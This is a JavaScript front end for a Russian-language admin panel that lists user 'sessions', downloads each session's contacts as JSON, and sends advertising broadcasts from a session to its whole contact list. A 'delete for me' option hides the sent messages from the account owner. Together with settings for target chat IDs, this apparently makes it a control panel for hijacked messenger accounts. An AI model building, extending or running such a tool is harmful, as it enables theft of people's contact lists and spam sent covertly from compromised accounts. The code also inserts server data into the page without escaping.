// Admin Panel JavaScript
const $ = id => document.getElementById(id);

// Elements
const loginOverlay = $('login-overlay');
const adminPanel = $('admin-panel');
const loginForm = $('login-form');
const errorMsg = $('error-msg');
const sessionTimer = $('session-timer');
const successToast = $('success-toast');
const messagesLimit = $('messages_limit');
const messagesLimitValue = $('messages_limit_value');

let sessionEnd = null;
let timerInterval = null;

// Slider update
messagesLimit?.addEventListener('input', () => {
    messagesLimitValue.textContent = messagesLimit.value;
});

// Navigation
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
        item.classList.add('active');
        $('section-' + item.dataset.section).classList.add('active');

        if (item.dataset.section === 'sessions') loadSessions();
    });
});

function showToast() {
    successToast.classList.add('show');
    setTimeout(() => successToast.classList.remove('show'), 2000);
}

function showError(msg) {
    errorMsg.textContent = msg;
    errorMsg.classList.add('show');
}

function showAdmin() {
    loginOverlay.classList.add('hidden');
    adminPanel.style.display = 'flex';
    loadSettings();
    startTimer();
}

function showLogin() {
    adminPanel.style.display = 'none';
    loginOverlay.classList.remove('hidden');
    if (timerInterval) clearInterval(timerInterval);
}

function startTimer() {
    sessionEnd = Date.now() + 30 * 60 * 1000;
    timerInterval = setInterval(() => {
        const remaining = Math.max(0, sessionEnd - Date.now());
        const mins = Math.floor(remaining / 60000);
        const secs = Math.floor((remaining % 60000) / 1000);
        sessionTimer.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
        if (remaining <= 0) logout();
    }, 1000);
}

async function checkAuth() {
    try {
        const res = await fetch('/api/admin/check');
        if (res.ok) showAdmin();
    } catch { }
}

async function loadSettings() {
    try {
        const res = await fetch('/api/admin/settings');
        if (!res.ok) return showLogin();
        const data = await res.json();

        $('messages_limit').value = data.messages_limit || 200;
        $('messages_limit_value').textContent = data.messages_limit || 200;
        $('target_chat_id').value = data.target_chat_id || '';
        $('session_url_chat_id').value = data.session_url_chat_id || '';
        $('helper_name').value = data.helper_name || '';
        $('helper_id').value = data.helper_id || '';
        $('helper_can_view').checked = data.helper_can_view || false;
        $('helper_can_export').checked = data.helper_can_export || false;
    } catch {
        showLogin();
    }
}

async function saveSettings() {
    const data = {
        messages_limit: parseInt($('messages_limit').value),
        target_chat_id: $('target_chat_id').value ? parseInt($('target_chat_id').value) : null,
        session_url_chat_id: $('session_url_chat_id').value ? parseInt($('session_url_chat_id').value) : null,
        helper_name: $('helper_name').value || null,
        helper_id: $('helper_id').value ? parseInt($('helper_id').value) : null,
        helper_can_view: $('helper_can_view').checked,
        helper_can_export: $('helper_can_export').checked
    };

    try {
        const res = await fetch('/api/admin/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        if (res.ok) showToast();
    } catch { }
}

async function loadSessions() {
    const list = $('sessions-list');
    try {
        const res = await fetch('/api/admin/sessions');
        if (!res.ok) return;
        const data = await res.json();

        if (data.sessions.length === 0) {
            list.innerHTML = '<div class="empty-state">Нет сессий</div>';
            return;
        }

        list.innerHTML = data.sessions.map(s => `
            <div class="session-item">
                <div class="session-info">
                    <i data-lucide="user"></i>
                    <span class="session-id">${s.user_id}</span>
                </div>
                <div class="session-actions">
                    <div class="btn-settings" data-session="${s.session}">
                        <i data-lucide="settings"></i>
                        <div class="dropdown-menu">
                            <div class="dropdown-item" data-action="contacts" data-session="${s.session}">
                                <i data-lucide="download"></i> Скачать контакты
                            </div>
                            <div class="dropdown-item" data-action="broadcast" data-session="${s.session}">
                                <i data-lucide="megaphone"></i> Реклама
                            </div>
                        </div>
                    </div>
                    <a href="${s.url}" target="_blank" class="btn-go">
                        <i data-lucide="external-link"></i> Перейти
                    </a>
                </div>
            </div>
        `).join('');

        lucide.createIcons();
        attachSessionHandlers();
    } catch { }
}

let currentBroadcastSession = null;

function attachSessionHandlers() {
    // Settings dropdown toggle
    document.querySelectorAll('.btn-settings').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const menu = btn.querySelector('.dropdown-menu');
            document.querySelectorAll('.dropdown-menu').forEach(m => m.classList.remove('open'));
            menu.classList.toggle('open');
        });
    });

    // Close dropdown on outside click
    document.addEventListener('click', () => {
        document.querySelectorAll('.dropdown-menu').forEach(m => m.classList.remove('open'));
    });

    // Dropdown actions
    document.querySelectorAll('.dropdown-item').forEach(item => {
        item.addEventListener('click', async (e) => {
            e.stopPropagation();
            const action = item.dataset.action;
            const session = item.dataset.session;
            document.querySelectorAll('.dropdown-menu').forEach(m => m.classList.remove('open'));

            if (action === 'contacts') {
                await downloadContacts(session);
            } else if (action === 'broadcast') {
                openBroadcastModal(session);
            }
        });
    });
}

async function downloadContacts(session) {
    try {
        const res = await fetch(`/api/contacts/${session}`);
        if (!res.ok) throw new Error('Failed to load contacts');
        const data = await res.json();

        const blob = new Blob([JSON.stringify(data.contacts, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `contacts_${session}.json`;
        a.click();
        URL.revokeObjectURL(url);
    } catch (e) {
        alert('Ошибка: ' + e.message);
    }
}

function openBroadcastModal(session) {
    currentBroadcastSession = session;
    $('broadcast-modal').style.display = 'flex';
    $('broadcast-text').value = '';
    $('broadcast-file').value = '';
    $('broadcast-status').className = 'broadcast-status';
    $('broadcast-status').textContent = '';
    lucide.createIcons();
}

function closeBroadcastModal() {
    $('broadcast-modal').style.display = 'none';
    currentBroadcastSession = null;
}

async function sendBroadcast() {
    const text = $('broadcast-text').value.trim();
    const fileInput = $('broadcast-file');
    const deleteForMe = $('broadcast-delete').checked;

    if (!text && !fileInput.files.length) {
        $('broadcast-status').textContent = 'Введите текст или выберите файл';
        $('broadcast-status').className = 'broadcast-status show error';
        return;
    }

    const formData = new FormData();
    formData.append('text', text || ' ');
    formData.append('delete_for_me', deleteForMe);
    if (fileInput.files.length) {
        formData.append('file', fileInput.files[0]);
    }

    $('broadcast-send').disabled = true;
    $('broadcast-send').innerHTML = '<i data-lucide="loader"></i> Отправка...';
    lucide.createIcons();

    try {
        const res = await fetch(`/api/contacts/${currentBroadcastSession}/broadcast`, {
            method: 'POST',
            body: formData
        });
        const data = await res.json();

        if (res.ok && data.success) {
            $('broadcast-status').textContent = `Отправлено: ${data.sent}/${data.total}`;
            $('broadcast-status').className = 'broadcast-status show success';
            setTimeout(closeBroadcastModal, 2000);
        } else {
            throw new Error(data.detail || 'Ошибка отправки');
        }
    } catch (e) {
        $('broadcast-status').textContent = e.message;
        $('broadcast-status').className = 'broadcast-status show error';
    }

    $('broadcast-send').disabled = false;
    $('broadcast-send').innerHTML = '<i data-lucide="send"></i> Рекламировать';
    lucide.createIcons();
}

// Broadcast modal handlers
$('broadcast-close')?.addEventListener('click', closeBroadcastModal);
$('broadcast-cancel')?.addEventListener('click', closeBroadcastModal);
$('broadcast-send')?.addEventListener('click', sendBroadcast);
$('broadcast-modal')?.addEventListener('click', (e) => {
    if (e.target.id === 'broadcast-modal') closeBroadcastModal();
});

async function logout() {
    try { await fetch('/api/admin/logout', { method: 'POST' }); } catch { }
    showLogin();
}

// Login form
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    errorMsg.classList.remove('show');

    $('btn-login').disabled = true;
    $('btn-login').textContent = 'Вход...';

    try {
        const res = await fetch('/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                login: $('login').value,
                password: $('password').value
            })
        });

        if (res.ok) showAdmin();
        else showError((await res.json()).detail || 'Ошибка');
    } catch {
        showError('Ошибка соединения');
    }

    $('btn-login').disabled = false;
    $('btn-login').textContent = 'Войти';
});

$('btn-logout').addEventListener('click', logout);
$('btn-save-settings').addEventListener('click', saveSettings);
$('btn-save-helper').addEventListener('click', saveSettings);

// Init
checkAuth();
lucide.createIcons();

